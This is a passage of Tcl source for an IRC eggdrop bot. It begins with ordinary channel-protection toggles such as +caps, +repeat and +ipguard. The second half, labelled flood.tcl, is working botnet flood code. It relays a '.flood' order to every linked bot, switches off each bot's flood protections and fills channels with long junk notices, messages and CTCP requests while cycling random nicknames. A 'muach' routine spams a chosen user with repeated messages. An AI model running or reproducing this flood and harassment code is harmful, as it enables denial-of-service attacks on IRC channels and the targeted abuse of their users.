puthlp "NOTICE $nick :$notc KeY $chan \[9$rest\]"
saveuser
}
proc pub_-key {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -K
setuser $cflag XTRA "CI" ""
puthlp "NOTICE $nick :$notc KeY $chan \[4OFF\]"
saveuser
}
proc pub_+text {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +text <max>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +T
setuser $cflag XTRA "CHAR" $rest
puthlp "NOTICE $nick :$notc TexT $chan MaX \[9$rest\]"
saveuser
}
proc pub_-text {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -T
setuser $cflag XTRA "CHAR" ""
puthlp "NOTICE $nick :$notc TexT $chan \[4OFF\]"
saveuser
}
proc pub_+caps {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +caps <%percent>"
return 0
}
if {$rest == 0 || $rest > 100} {
puthlp "NOTICE $nick :$notc fill under 1 - 100%"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +U
setuser $cflag XTRA "CAPS" $rest
puthlp "NOTICE $nick :$notc CAPS $chan \[9$rest%\]"
saveuser
}
proc pub_-caps {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -U
setuser $cflag XTRA "CAPS" ""
puthlp "NOTICE $nick :$notc cAPs $chan \[4OFF\]"
saveuser
}
proc pub_+repeat {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +repeat <max>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cAnT UsE NuLL"

return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +R
setuser $cflag XTRA "RPT" $rest
puthlp "NOTICE $nick :$notc RePeaT $chan MaX \[9$rest\]"
saveuser
}
proc pub_-repeat {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -R
setuser $cflag XTRA "RPT" ""
puthlp "NOTICE $nick :$notc RePeaT $chan \[4OFF\]"
saveuser
}
proc pub_+autovoice {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +AuTovoIcE <secs>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cAnT UsE NuLL"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +V
setuser $cflag XTRA "VC" $rest
puthlp "NOTICE $nick :$notc AuTovoIcE $chan qUeUe \[9$rest\] 2nd"
saveuser
pub_mvoice $nick $uhost $hand $chan ""
}
proc pub_-autovoice {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -V
setuser $cflag XTRA "VC" ""
puthlp "NOTICE $nick :$notc AuTovoIcE $chan \[4OFF\]"
saveuser
foreach x [utimers] {
if {[string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
}
}
proc pub_+enforceban {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +E
puthlp "NOTICE $nick :$notc enforceban $chan \[9ON\]"
saveuser
}
proc pub_-enforceban {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -E
puthlp "NOTICE $nick :$notc enforceban $chan \[4OFF\]"
saveuser
}
proc pub_+revenge {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +D
puthlp "NOTICE $nick :$notc revenge $chan \[9ON\]"
saveuser
}
proc pub_-revenge {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -D
puthlp "NOTICE $nick :$notc revenge $chan \[4OFF\]"
saveuser
}
proc pub_+forced {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +M
puthlp "NOTICE $nick :$notc forced $chan \[9ON\]"
saveuser
}
proc pub_-forced {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
chattr $cflag -M
puthlp "NOTICE $nick :$notc forced $chan \[4OFF\]"
saveuser
}
proc pub_-colour {nick uhost hand chan rest} {
global notc kickclr
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set kickclr "T"
setuser "config" XTRA "KCLR" "Y"
puthlp "NOTICE $nick :$notc colour kick \[4OFF\]"
saveuser
}
proc pub_+colour {nick uhost hand chan rest} {
global notc kickclr
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch {unset kickclr}
setuser "config" XTRA "KCLR" ""
puthlp "NOTICE $nick :$notc colour kick \[9ON\]"
saveuser
}
proc pub_+colours {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +W
setuser $cflag XTRA "COLOR" ""
puthlp "NOTICE $nick :$notc colours kick $chan \[9ON\]"
saveuser
}
proc pub_-colours {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -W
puthlp "NOTICE $nick :$notc colours kick $chan \[4OFF\]"
saveuser
}
proc pub_+bold {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag +B
setuser $cflag XTRA "BOLD" ""
puthlp "NOTICE $nick :$notc BOLD kick $chan \[9ON\]"
saveuser
}
proc pub_-bold {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $cflag -B
puthlp "NOTICE $nick :$notc bOLd kick $chan \[4OFF\]"
saveuser
}
proc pub_+ipguard {nick uhost hand channel param} {
global botname botnick notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +ipguard <hostname>"
return 0
}
if {$rest == "*" || $rest == "*!*@*"} {
puthlp "NOTICE $nick :$notc invalid hostname..!"
return 0
}
if {![string match "*@*" $rest]} {
puthlp "NOTICE $nick :$notc Usage: +ipguard <hostname>"
return 0
}
set ipguard [getuser "config" XTRA "IPG"]
foreach y $ipguard {
if {$y == $rest} {
puthlp "NOTICE $nick :$notc $rest allready added..!"
return 0
}
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
puthlp "NOTICE $nick :$notc add \[$rest\] To IpguaRd"
lappend ipguard $rest
setuser "config" XTRA "IPG" $ipguard
saveuser
return 0
}
bind ctcr - PING xactr
proc pub_-ipguard {nick uhost hand channel param} {
global notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -ipguard <hostname>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set ipguard [getuser "config" XTRA "IPG"]
set nipg ""
set ok "F"
foreach y $ipguard {
if {$y == $rest} {
set ok "T"
puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM IpguaRd"
} {
lappend nipg
}
}
if {$ok == "T"} {
setuser "config" XTRA "IPG" $nipg
saveuser
return 0
}
puthlp "NOTICE $nick :$notc $rest not founded..!"
}
setudef flag action
proc pub_+action {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*+action*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc $chan 4ReADY!!"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc AcTion Random \[9ON\]"
} {
setuser $cflag XTRA "ACTION" $rest
puthlp "NOTICE $nick :$notc AcTion SeT TO \[$rest\]"
}
catch { channel set $chan +action }
puthlp "NOTICE $nick :$notc AcTion $chan \[9ON\]"
saveuser
}
proc pub_-action {nick uhost hand chan rest} {
global notc
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*-action*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc AcTion $chan already 4DISaBLE."
return 0
}
catch { channel set $chan -action }

setuser $cflag XTRA "ACTION" ""
puthlp "NOTICE $nick :$notc AcTion $chan \[4Off\]"
saveuser
}
setudef flag guest
proc pub_+guest {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*+guest*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc $chan 4ReADY!!"
return 0
}
catch { channel set $chan +guest }
puthlp "NOTICE $nick :$notc Guest Nick Kick (@) & Report $chan \[9ON\]"
saveuser
}
proc pub_-guest {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*-guest*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc Guest Nick Kick (@) & Report $chan already 4DISaBLE."
return 0
}
catch { channel set $chan -guest }
puthlp "NOTICE $nick :$notc Guest Nick Kick (@) & Report $chan \[4Off\]"
saveuser
}
setudef flag trojan
proc pub_+trojan {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthelp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*+trojan*" [channel info $chan]]} {
puthelp "NOTICE $nick :$notc $chan 4ReADY!!"
return 0
}
catch { channel set $chan +trojan }
puthelp "NOTICE $nick :$notc trojan Nick Kick (@) & Report $chan \[9ON\]"
saveuser
}
proc pub_-trojan {nick uhost hand chan rest} {
global notc
if {![matchattr $nick Q]} {
puthelp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[string match "*-trojan*" [channel info $chan]]} {
puthelp "NOTICE $nick :$notc trojan Nick Kick (@) & Report $chan already 4DISaBLE."
return 0
}
catch { channel set $chan -trojan }
puthelp "NOTICE $nick :$notc trojan Nick Kick (@) & Report $chan \[4Off\]"
saveuser
}
##########################################################################
# [flood.tcl]                                                            #
# commands:                                                              #
# .flood <channel> <num>   - does a hopflud <num> times on <channel>     #
# .hopmode <on|off>        - switch individuell bot <on> or <off>        #
##########################################################################
## Flood Command List
bind bot - flood dohopflud
bind dcc n flood inithopflud
bind dcc n hopmode sethopmode
bind pub Z `muach pub_muach
bind pub Z `kill pub_kill
bind pub Z `joinpart pub_joinpart
bind pub Z `fluud pub_fluud
bind msg n muach msg_muach
bind msg n kill msg_kill
bind msg n joinpart msg_joinpart
bind msg n fluud msg_fluud

set hopmod "on"
set misc_char "a b c d e f g h i j k l m n o p q r s t u v
w x y z 0 1 2 3 4 5 6 7 8 9 ^ _ | -"
set first_char "a b c d e f g h i j k l m n o p q r s t u v w x y z"

proc randomnick {} {
global misc_char first_char
append temp_nick [lindex $first_char [rand [llength $first_char]]]
set i 1
while {$i < 9} {
append temp_nick [lindex $misc_char [rand [llength $misc_char]]]
incr i 1
}
putserv "NICK ${temp_nick}"
unset temp_nick
}
proc restorenick {} {
global nick
putserv "NICK ${nick}"
}
proc inithopflud {hand idx arg} {
global hopmod notc
set chan [lindex $arg 0]
set times [lrange $arg 1 end]
if { $chan != "" } {
if { $times != "" } {
putallbots "flood $arg"
putdcc $idx "$notc flood $chan $times times."
if { $hopmod == "on" } {
dohopflud bot flood $arg
}
} {
putdcc $idx "$notc usage: .flood <channel> <times>"
}
} {
putdcc $idx "$notc usage: .flood <channel> <times>"
}
}
proc sethopmode {hand idx arg} {
global hopmod
putdcc $idx "$notc  hopmode currently $hopmod"
if { $arg == "on" } {
set hopmod $arg
putdcc $idx "$notc hopmode set on"
} {
if { $arg == "off" } {
set hopmod $arg
putdcc $idx "$notc hopmode set off"
} {
putdcc $idx "$notc usage: .hopmode on/off"
}
}
}
proc dohopflud {bot cmd arg} {
global hopmod
global keep-nick
set chan [lindex $arg 0]
set times [lrange $arg 1 end]
channel add $chan
catch { channel set $chan +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
if { $hopmod == "on" } {
set i 0
while { $i < $times } {
set keep-nick 0
pub_muach "*" "*" "*" $chan "*"
puthelp "NOTICE $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "PRIVMSG $chan :HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHHaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHaHa!HaHa!HaHaHa!HaHa!HaHaHa!HaHa!Ha"
puthelp "CTCP $chan PING"
puthelp "PRIVMSG $chan :,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|@#$%||@#$%|||@#$%|||@#$%|||@#$%||"
puthelp "NOTICE $chan :,|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|@#$%||@#$%||@#$%||@#$%||@#$%||@#$%|||@#$%|||@#$%|||@#$%||"
puthelp "CTCP $chan VERSION"
randomnick
incr i 1
}
}
set keep-nick 1
restorenick
}
## public cmd flood muach -- start
proc msg_muach {nick uhost hand rest} {
pub_muach $nick $uhost $hand "*" $rest
}
proc pub_muach {nick uhost hand channel rest} {
global notc ps owner
set person [lindex $rest 0]
set rest [lrange $rest 1 end]
if {[string tolower $person]==[string tolower $ps] || [string tolower $person]==[string tolower $owner]} {
return 0
}
if {$rest!=""} {
puthelp "NOTICE $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "PRIVMSG $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
puthelp "NOTICE $person :$rest, M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H M&#249;[rand 15]&#226;&#231;H"
